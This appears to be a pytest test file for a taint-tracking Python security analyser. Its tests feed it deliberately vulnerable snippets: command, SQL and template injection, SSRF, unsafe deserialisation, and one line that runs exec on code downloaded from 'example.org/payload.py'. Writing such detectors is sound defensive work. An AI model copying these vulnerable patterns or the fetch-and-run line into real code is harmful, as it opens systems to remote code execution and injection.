'''Security reasoning engine: taint, policy queries, aliases, sanitisers, loops, embedded code.'''

# Python stuff
from pathlib import Path
from textwrap import dedent
from typing  import List, Set, Tuple

import pytest
from astroid import builder  # type: ignore

# My stuff
from core.reasoning.loader      import LoadSchema, SchemaBundle
from core.reasoning.interpreter import Interpreter
from core.reasoning.queries     import EvaluateAll, Finding

SCHEMA: SchemaBundle = LoadSchema(Path(__file__).resolve().parent.parent / "schema.yml")

def Findings(source: str) -> List[Finding]:
    module = builder.parse(dedent(source))
    return EvaluateAll(Interpreter(SCHEMA).Analyze(module), SCHEMA)

def Queries(source: str) -> Set[str]:
    return {f.query_name for f in Findings(source)}

def Calls(source: str) -> List[Tuple[str, int]]:
    return [(f.call_name, f.line) for f in Findings(source)]

# vvv Taint vs constant (the paper's core claim) vvv
def test_tainted_exec_is_critical_constant_exec_is_low():
    tainted:  List[Finding] = Findings("exec(input())")
    constant: List[Finding] = Findings("exec('x = 1')")
    assert {f.severity for f in tainted}  == {"critical"}
    assert {f.severity for f in constant} == {"low"}

def test_taint_flows_through_assignment_and_fstring():
    assert "dynamic_execution_external" in Queries("a = input()\nb = f'print({a})'\nexec(b)")

def test_external_attribute_sources_come_from_schema():
    assert "spawn_external_command" in Queries("import os, sys\nos.system(sys.argv[1])")
    assert "argv" in SCHEMA.sources.attributes

def test_seeded_request_global():
    assert "dynamic_execution_external" in Queries("eval(request.args)")

def test_parameter_is_dynamic_not_external():
    q: Set[str] = Queries("def f(code):\n    exec(code)")
    assert "dynamic_execution_unknown" in q
    assert "dynamic_execution_external" not in q

def test_equality_refinement_drops_dynamic():
    q: Set[str] = Queries("def f(cmd):\n    if cmd == 'ls':\n        import os\n        os.system(cmd)")
    assert "spawn_dynamic_command" not in q

# vvv Import aliases vvv
@pytest.mark.parametrize("source, call", [
    ("import subprocess as sp\nsp.run(input())",           "subprocess.run"),
    ("from os import system\nsystem(input())",             "os.system"),
    ("from subprocess import Popen as P\nP(input())",      "subprocess.Popen"),
    ("from hashlib import md5\nmd5(b'x')",                 "hashlib.md5"),
])
def test_import_aliases_resolve_to_schema_names(source: str, call: str):
    assert call in {name for name, _ in Calls(source)}

def test_rebinding_an_alias_shadows_the_import():
    assert Findings("import subprocess as sp\nsp = object()\nsp.run(input())") == []

def test_relative_import_is_not_treated_as_stdlib():
    assert Findings("from . import system\nsystem(input())") == []

# vvv Sanitisers vvv
def test_shlex_quote_sanitises_shell_argument():
    assert Findings("import os, shlex\nos.system('ls ' + shlex.quote(input()))") == []

def test_unsanitised_shell_argument_still_fires():
    assert "spawn_external_command" in Queries("import os\nos.system('ls ' + input())")

def test_int_conversion_sanitises():
    assert Findings("import os\nos.system('kill ' + str(int(input())))") == []

def test_basename_removes_taint_but_path_stays_dynamic():
    q: Set[str] = Queries("import os\nopen(os.path.basename(input()))")
    assert q == {"filesystem_dynamic_path"}

def test_sanitiser_does_not_hide_other_operands():
    q: Set[str] = Queries("import os, shlex\nos.system(input() + shlex.quote(input()))")
    assert "spawn_external_command" in q

# vvv Loops vvv
@pytest.mark.parametrize("source", [
    "x = 'a'\nfor i in range(3):\n    exec(x)\n    x = input()",
    "x = 'a'\nwhile True:\n    exec(x)\n    x = input()",
])
def test_loop_carried_taint_is_found(source: str):
    assert "dynamic_execution_external" in Queries(source)

def test_loop_records_each_call_site_once():
    calls: List[Tuple[str, int]] = Calls("for i in range(5):\n    exec(input())")
    assert calls == [("exec", 2)]

def test_nested_loops_terminate():
    src: str = "x = 'a'\nfor i in r:\n    for j in r:\n        while c:\n            exec(x)\n            x = input()"
    assert "dynamic_execution_external" in Queries(src)

# vvv Embedded code in strings vvv
def test_code_inside_exec_string_is_analysed():
    findings: List[Finding] = Findings('exec("a = input(); exec(a)")')
    assert any(f.severity == "critical" and "→exec" in f.call_name for f in findings)

def test_embedded_analysis_is_depth_bounded():
    src: str = "x = 1"
    for _ in range(12):
        src = f"exec({src!r})"
    findings: List[Finding] = Findings(src)  # must not recurse forever or raise
    assert all(f.call_name.count("→") < 12 for f in findings)

# vvv Chained calls vvv
@pytest.mark.parametrize("source, call", [
    ("import hashlib\nhashlib.sha1(b'k').hexdigest()",    "hashlib.sha1"),
    ("import os\nos.popen(input()).read()",               "os.popen"),
    ("import subprocess\nsubprocess.Popen(input(), shell=True).wait()", "subprocess.Popen"),
])
def test_capability_in_call_receiver_is_detected(source: str, call: str):
    assert call in {name for name, _ in Calls(source)}

# vvv Other capabilities vvv
def test_weak_hash_fires_on_constant_input():
    assert "weak_hash_used" in Queries("import hashlib\nhashlib.md5(b'x')")

def test_filesystem_queries():
    assert "filesystem_external_input" in Queries("open(input())")
    assert Findings("open('settings.ini')") == []
    assert {f.severity for f in Findings("def f(p):\n    return open(p)")} == {"low"}

def test_module_receiver_does_not_mask_dynamic_argument():
    assert "spawn_dynamic_command" in Queries("import os\nos.system(os.getcwd())")

def test_findings_are_deterministic_and_sorted():
    src: str = "import os\nexec(input())\nos.system(input())\nopen(input())"
    first, second = Findings(src), Findings(src)
    assert [(f.query_name, f.line) for f in first] == [(f.query_name, f.line) for f in second]
    assert [f.line for f in first] == sorted(f.line for f in first)

# vvv Path traversal: web sources, containment guards, early exits vvv
ROUTE = '''
    import os
    from flask import Flask, abort, send_file
    app = Flask(__name__)
    BASE = "/srv/files"

    @app.route("/get/<path:name>")
    def get(name):
        p = os.path.join(BASE, name)
        {guard}
        return send_file(p)
'''

def test_route_parameter_reaching_file_sink_is_external():
    assert "filesystem_external_input" in Queries(ROUTE.format(guard=""))

def test_parameter_of_plain_function_stays_dynamic():
    assert "filesystem_external_input" not in Queries("import os\ndef f(name):\n    open(os.path.join('/x', name))")

@pytest.mark.parametrize("guard", [
    "p = os.path.abspath(p)\n        if not p.startswith(BASE):\n            abort(403)",
    "if not is_safe_path(BASE, p):\n            abort(403)",
    "if not is_safe_path(BASE, p):\n            raise PermissionError(p)",
])
def test_containment_guard_with_early_exit_clears_the_path(guard: str):
    assert not Queries(ROUTE.format(guard=guard)) & {"filesystem_external_input", "filesystem_dynamic_path"}

def test_prefix_check_without_normalisation_is_not_a_guard():
    guard = "if not p.startswith(BASE):\n            abort(403)"
    assert "filesystem_external_input" in Queries(ROUTE.format(guard=guard))

def test_guard_without_exit_does_not_clear_the_path():
    guard = "if not is_safe_path(BASE, p):\n            print('unsafe')"
    assert "filesystem_external_input" in Queries(ROUTE.format(guard=guard))

def test_secure_filename_removes_external_origin():
    src = ROUTE.format(guard="").replace("os.path.join(BASE, name)", "os.path.join(BASE, secure_filename(name))")
    src = src.replace("from flask import", "from werkzeug.utils import secure_filename\n    from flask import")
    assert "filesystem_external_input" not in Queries(src)

# vvv Function summaries (same file) vvv
def test_taint_reaches_sink_inside_helper():
    src = ("import subprocess\nfrom flask import request\n"
           "def run(cmd):\n    subprocess.run(cmd, shell=True)\n"
           "def view():\n    run(request.args['c'])\n")
    found = [(f.query_name, f.call_name, f.line) for f in Findings(src)]
    assert ("spawn_external_command", "run→subprocess.run", 6) in found

def test_helper_return_value_carries_taint():
    src = "def ident(x):\n    return x\nopen(ident(input()))\n"
    assert "filesystem_external_input" in Queries(src)

def test_constant_returning_helper_cleans_value():
    src = "import os\ndef pick(x):\n    return 'ls'\nos.system(pick(input()))\n"
    assert not {"spawn_external_command", "spawn_dynamic_command"} & Queries(src)

def test_recursive_helper_terminates():
    src = "def f(x):\n    return f(x)\nexec(f(input()))\n"
    assert Queries(src)

def test_parameter_reaching_helper_sink_is_reported_at_call():
    calls = Calls("import os\ndef sh(c):\n    os.system(c)\ndef outer(arg):\n    sh(arg)\n")
    assert ("sh→os.system", 5) in calls and ("os.system", 3) in calls

def test_method_of_constructed_object_is_followed():
    src = ("import os\nclass Shell:\n    def run(self, c):\n        os.system(c)\n"
           "class Job:\n    def __init__(self):\n        self.sh = Shell()\n    def go(self, x):\n        self.sh.run(x)\n"
           "def main():\n    s = Shell()\n    s.run(input())\n")
    calls = Calls(src)
    assert ("Shell.run→os.system", 9) in calls
    assert "spawn_external_command" in Queries(src)

# vvv 1.5.0: validators, assert and blacklist checks, more sinks vvv
def test_validator_statement_clears_its_argument():
    vuln = "import flask\np = request.args['p']\nflask.send_file(p)"
    safe = "import flask\np = request.args['p']\nvalidate_path_is_safe(p)\nflask.send_file(p)"
    assert "filesystem_external_input" in Queries(vuln)
    assert Queries(safe) == set()

def test_validator_result_is_validated():
    assert Queries("p = _validate_path(request.args['p'])\nopen(p)") == set()

def test_unrelated_helper_is_not_a_validator():
    assert "filesystem_external_input" in Queries("p = normalise(request.args['p'])\nopen(p)")

def test_assert_blacklist_clears_command():
    vuln = "import os\nd = input()\nos.popen('echo ' + d)"
    safe = "import os\nd = input()\nassert ';' not in d and '|' not in d\nos.popen('echo ' + d)"
    assert "spawn_external_command" in Queries(vuln)
    assert not {q for q in Queries(safe) if q.startswith("spawn")}

def test_raise_on_metacharacter_clears_value():
    src = "import os\nd = input()\nif '..' in d or '/' in d:\n    raise ValueError()\nopen(d)"
    assert "filesystem_external_input" not in Queries(src)

def test_non_metacharacter_check_does_not_clear():
    src = "import os\nd = input()\nassert 'abc' not in d\nos.system(d)"
    assert "spawn_external_command" in Queries(src)

def test_commonpath_check_on_normalised_path():
    src = dedent('''
        import os
        root = os.path.realpath("/srv")
        p = os.path.realpath(os.path.join(root, request.args["f"]))
        if os.path.commonpath([root, p]) != root:
            raise ValueError()
        open(p)
    ''')
    assert "filesystem_external_input" not in Queries(src)
    assert "filesystem_external_input" in Queries(src.replace("commonpath", "commonprefix"))

def test_anchored_regex_is_an_allowlist():
    ok  = "import re, os\nn = input()\nif not re.match(r'^[a-z]+$', n):\n    raise ValueError()\nos.system('x ' + n)"
    bad = ok.replace("+$'", "+'")
    assert not {q for q in Queries(ok) if q.startswith("spawn")}
    assert "spawn_external_command" in Queries(bad)

def test_new_process_sinks():
    assert "spawn_external_command" in Queries("import subprocess\nsubprocess.check_output(input(), shell=True)")
    assert "spawn_external_command" in Queries("import subprocess\nsubprocess.getoutput(input())")

def test_pathlib_methods_are_file_access():
    src = "from pathlib import Path\nt = Path('/srv') / request.args['t']\nt.read_text()"
    assert "filesystem_external_input" in Queries(src)
    assert Queries("s = 'x'\ns.replace('a', 'b')") == set()   # replace on a str is not a path method

def test_tar_extraction_needs_a_filter():
    vuln = "import tarfile\nwith tarfile.open(name) as tar:\n    tar.extractall(dest)"
    safe = "import tarfile\nwith tarfile.open(name) as tar:\n    tar.extractall(dest, filter='data')"
    assert "archive_extraction_unfiltered" in Queries(vuln)
    assert Queries(safe) == set()

def test_yaml_load_is_unsafe_without_safe_loader():
    assert "deserialize_external" in Queries("import yaml\nyaml.load(input())")
    assert Queries("import yaml\nyaml.load(input(), Loader=yaml.SafeLoader)") == set()
    assert Queries("import yaml\nyaml.load(input(), yaml.CSafeLoader)") == set()

def test_pickle_of_file_contents_is_high():
    f: List[Finding] = Findings("import pickle\nwith open(p, 'rb') as fh:\n    pickle.load(fh)")
    assert "deserialize_external" in {x.query_name for x in f}

def test_values_derived_from_a_path_are_not_paths():
    base = "from pathlib import Path\np = Path('/srv') / request.args['t']\n"
    assert "filesystem_external_input" in Queries(base + "p.parent.joinpath('x').resolve().read_text()")
    assert Queries(base + "str(p).replace('a', 'b')") == set()
    assert Queries(base + "p.name.replace('a', 'b')") == set()

# vvv Attribute (field-sensitive) taint vvv
def test_tainted_attribute_reaches_sink_in_same_function():
    src = """
    import subprocess
    class Job:
        def start(self):
            self.cmd = input()
            subprocess.run(self.cmd, shell=True)
    """
    assert "spawn_external_command" in Queries(src)

def test_constant_attribute_is_not_external():
    # `data` is an external attribute name (request.data), but self.data was assigned a constant
    src = """
    def f(self):
        self.data = 'config.ini'
        open(self.data)
    """
    q = Queries(src)
    assert "filesystem_external_input" not in q and "filesystem_dynamic_path" not in q

def test_attribute_reassignment_is_a_strong_update():
    src = """
    import os
    def f(obj):
        obj.cmd = input()
        obj.cmd = 'ls'
        os.system(obj.cmd)
    """
    assert "spawn_external_command" not in Queries(src)

def test_attribute_set_in_one_branch_keeps_taint():
    src = """
    import os
    def f(obj, flag):
        obj.cmd = 'ls'
        if flag:
            obj.cmd = input()
        os.system(obj.cmd)
    """
    assert "spawn_external_command" in Queries(src)

def test_constructor_argument_reaches_attribute():
    src = """
    import os
    class Repo:
        def __init__(self, path):
            self.path = path
    r = Repo(input())
    os.remove(r.path)
    """
    assert "filesystem_external_input" in Queries(src)

def test_constructor_field_reaches_sink_in_method():
    src = """
    import subprocess
    class Repo:
        def __init__(self, url):
            self.url = url
        def clone(self):
            subprocess.run("git clone " + self.url, shell=True)
    Repo(input()).clone()
    r = Repo(input())
    r.clone()
    """
    lines = {f.line for f in Findings(src) if f.query_name == "spawn_external_command"}
    assert {8, 10} <= lines

def test_constant_constructor_argument_is_not_external():
    src = """
    import subprocess
    class Repo:
        def __init__(self, url):
            self.url = url
        def clone(self):
            subprocess.run("git clone " + self.url, shell=True)
    r = Repo("https://example.org/x.git")
    r.clone()
    """
    assert "spawn_external_command" not in Queries(src)

def test_setter_updates_the_receiver():
    src = """
    import os
    class Job:
        def __init__(self):
            self.cmd = 'true'
        def set_command(self, cmd):
            self.cmd = cmd
        def run(self):
            os.system(self.cmd)
    j = Job()
    j.set_command(input())
    j.run()
    """
    assert any(f.query_name == "spawn_external_command" and f.line == 12 for f in Findings(src))

def test_self_attribute_flows_to_own_method():
    src = """
    import os
    class Job:
        def handle(self):
            self.name = input()
            self.delete()
        def delete(self):
            os.remove(self.name)
    """
    assert "filesystem_external_input" in Queries(src)

def test_nested_attribute_path():
    src = """
    import os
    def f(self):
        self.repo.path = input()
        os.remove(self.repo.path)
    """
    assert "filesystem_external_input" in Queries(src)

def test_guard_on_attribute_clears_it():
    src = """
    import os
    from flask import abort
    def f(self):
        self.path = os.path.realpath(input())
        if not is_safe_path(self.path):
            abort(403)
        os.remove(self.path)
    """
    assert "filesystem_external_input" not in Queries(src)

def test_attribute_of_untracked_object_falls_back_to_object():
    assert "dynamic_execution_external" in Queries("eval(request.args.get('x'))")

# vvv SQL injection, SSRF, template injection vvv
def test_sql_built_from_request_is_high():
    src = """
    def view(cursor):
        name = request.args['name']
        cursor.execute("SELECT * FROM users WHERE name = '%s'" % name)
    """
    assert {f.severity for f in Findings(src) if f.query_name == "sql_external_query"} == {"high"}

def test_parameterised_query_is_not_a_finding():
    src = """
    def view(cursor):
        cursor.execute("SELECT * FROM users WHERE name = %s", (request.args['name'],))
    """
    assert not {q for q in Queries(src) if q.startswith("sql_")}

def test_sql_from_parameter_is_low():
    assert "sql_dynamic_query" in Queries("def f(db, table):\n    db.execute('DELETE FROM ' + table)")

def test_quoted_identifier_is_not_external():
    src = """
    def view(cursor, connection):
        t = connection.ops.quote_name(request.args['t'])
        cursor.execute('SELECT * FROM ' + t)
    """
    assert "sql_external_query" not in Queries(src)

def test_sqlalchemy_text_and_django_raw():
    q = Queries("import sqlalchemy\nsqlalchemy.text(f\"SELECT {request.args['c']}\")")
    assert "sql_external_query" in q
    q = Queries("def v(User):\n    User.objects.raw('SELECT * FROM u WHERE id=' + request.GET['id'])")
    assert "sql_external_query" in q

def test_project_method_named_execute_is_followed_not_a_sink():
    src = """
    class Task:
        def execute(self, x):
            return x
    Task().execute(request.args['q'])
    """
    assert not {q for q in Queries(src) if q.startswith("sql_")}

def test_request_to_user_url_is_ssrf():
    q = Queries("import requests\nrequests.get(request.args['url'])")
    assert "ssrf_external_url" in q
    q = Queries("import requests\nrequests.request('GET', request.args['url'])")
    assert "ssrf_external_url" in q

def test_tainted_request_body_is_not_ssrf():
    q = Queries("import requests\nrequests.post('https://api.example.org/x', data=request.form['d'])")
    assert not {x for x in q if x.startswith("ssrf_")}

def test_session_request_is_ssrf_and_response_is_external():
    src = """
    import requests
    s = requests.Session()
    s.get(request.args['u'])
    exec(requests.get('https://example.org/payload.py').text)
    """
    q = Queries(src)
    assert "ssrf_external_url" in q
    assert "dynamic_execution_external" in q

def test_url_allowlist_clears_url():
    src = """
    import requests
    from flask import abort
    def proxy():
        url = request.args['url']
        if not url_has_allowed_host_and_scheme(url, allowed_hosts={'example.org'}):
            abort(400)
        requests.get(url)
    """
    assert "ssrf_external_url" not in Queries(src)

def test_template_from_request_is_critical():
    q = Queries("from flask import render_template_string\nrender_template_string('Hi ' + request.args['n'])")
    assert "template_external_source" in q
    q = Queries("import jinja2\njinja2.Environment().from_string(request.form['t'])")
    assert "template_external_source" in q

def test_sandboxed_template_and_template_context_are_safe():
    q = Queries("from jinja2.sandbox import SandboxedEnvironment\nSandboxedEnvironment().from_string(request.form['t'])")
    assert "template_external_source" not in q
    q = Queries("from flask import render_template_string\nrender_template_string('Hi {{ n }}', n=request.args['n'])")
    assert not {x for x in q if x.startswith("template_")}

def test_sql_through_attribute():
    src = """
    class Search:
        def __init__(self, term):
            self.term = term
        def run(self, cursor):
            cursor.execute("SELECT * FROM t WHERE x LIKE '%" + self.term + "%'")
    Search(request.args['q']).run(db)
    """
    assert "sql_external_query" in Queries(src)

def test_get_on_request_attribute_of_imported_request_is_external():
    src = """
    import os
    from flask import request
    def view():
        os.system(request.args.get("cmd", "true"))
    """
    assert "spawn_external_command" in Queries(src)
